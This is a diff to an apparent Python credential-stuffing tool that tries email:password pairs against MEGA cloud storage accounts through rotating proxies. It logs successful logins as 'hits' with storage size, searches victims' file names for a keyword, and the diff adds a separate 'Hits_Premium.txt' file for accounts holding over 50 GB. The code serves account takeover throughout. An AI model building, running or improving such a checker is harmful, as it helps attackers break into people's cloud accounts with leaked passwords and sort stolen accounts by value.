@@ -160,6 +160,30 @@ class FileWriter:
                 f.write(line + "\n")
 
 
+PREMIUM_FILEPATH = "Hits_Premium.txt"
+_default_premium_writer = FileWriter(PREMIUM_FILEPATH)
+
+
+def parse_total_gb(total) -> float:
+    """Safely parse total space value into float GB."""
+    if isinstance(total, (int, float)):
+        return float(total)
+    if isinstance(total, str):
+        cleaned = total.upper().strip()
+        if "TB" in cleaned:
+            cleaned = cleaned.replace("TB", "").strip()
+            try:
+                return float(cleaned) * 1024.0
+            except ValueError:
+                return 0.0
+        cleaned = cleaned.replace("GB", "").strip()
+        try:
+            return float(cleaned)
+        except ValueError:
+            return 0.0
+    return 0.0
+
+
 # ─── Proxy Pool ───────────────────────────────────────────────
 
 class ProxyPool:
@@ -222,8 +246,12 @@ def _safe_print(msg: str):
     with _print_lock:
         print(msg)
 
-def log_hit(msg: str):
-    _safe_print(f"{Fore.GREEN}[  HIT   ] {Style.RESET_ALL}{msg}")
+def log_hit(msg: str, is_premium: bool = False):
+    color = Fore.LIGHTMAGENTA_EX if is_premium else Fore.GREEN
+    _safe_print(f"{color}[  HIT   ] {Style.RESET_ALL}{msg}")
+
+def log_hit_premium(msg: str):
+    log_hit(msg, is_premium=True)
 
 def log_fail(msg: str):
     _safe_print(f"{Fore.RED}[  FAIL  ] {Style.RESET_ALL}{msg}")
@@ -260,8 +288,12 @@ async def check_account(
     writer: FileWriter,
     proxy_pool: ProxyPool,
     search_string: str = "",
-    semaphore: asyncio.Semaphore = None
+    semaphore: asyncio.Semaphore = None,
+    premium_writer: FileWriter = None,
 ):
+    if premium_writer is None:
+        premium_writer = _default_premium_writer
+
     if semaphore:
         await semaphore.acquire()
         
@@ -277,15 +309,16 @@ async def check_account(
                 await client.login(email, password)
 
                 storage = await client.get_storage()
-                used_gb = storage['used_gb']
-                total_gb = storage['total_gb']
+                used_gb = storage.get('used_gb', 0)
+                total_gb = storage.get('total_gb', 0)
 
                 keyword_found = False
-                if search_string:
+                search_kw = search_string.strip() if search_string else ""
+                if search_kw:
                     try:
                         file_names = await client.get_file_names()
                         keyword_found = any(
-                            search_string.lower() in name.lower()
+                            search_kw.lower() in name.lower()
                             for name in file_names
                         )
                     except Exception:
@@ -294,16 +327,22 @@ async def check_account(
                 current = stats.inc_checked()
                 stats.inc_hits()
 
-                hit_line = (
-                    f"{email}:{password} | "
-                    f"Used: {used_gb}GB / {total_gb}GB | "
-                    f"Keyword: {search_string or 'N/A'} = "
-                    f"{'TRUE' if keyword_found else 'FALSE'} | "
-                    f"[{current}/{stats.total}]"
-                )
+                hit_parts = [
+                    f"{email}:{password}",
+                    f"Used: {used_gb}GB / {total_gb}GB"
+                ]
+                if search_kw:
+                    hit_parts.append(
+                        f"Keyword: {search_kw} = {'TRUE' if keyword_found else 'FALSE'}"
+                    )
+                file_hit_line = " | ".join(hit_parts)
+                console_hit_line = f"{file_hit_line} | [{current}/{stats.total}]"
 
-                log_hit(hit_line)
-                writer.write(hit_line)
+                is_premium = parse_total_gb(total_gb) > 50
+                log_hit(console_hit_line, is_premium=is_premium)
+                writer.write(file_hit_line)
+                if is_premium:
+                    premium_writer.write(file_hit_line)
                 return
 
             except MegaLoginError:
@@ -508,6 +547,7 @@ async def amain():
 
     stats = Stats(total=len(pairs))
     writer = FileWriter(filename)
+    premium_writer = _default_premium_writer
 
     stop_event = threading.Event()
     threading.Thread(
@@ -524,7 +564,18 @@ async def amain():
     tasks = []
     for email, password in pairs:
         tasks.append(
-            asyncio.create_task(check_account(email, password, stats, writer, proxy_pool, search_string, semaphore))
+            asyncio.create_task(
+                check_account(
+                    email,
+                    password,
+                    stats,
+                    writer,
+                    proxy_pool,
+                    search_string,
+                    semaphore,
+                    premium_writer,
+                )
+            )
         )
         
     await asyncio.gather(*tasks, return_exceptions=True)
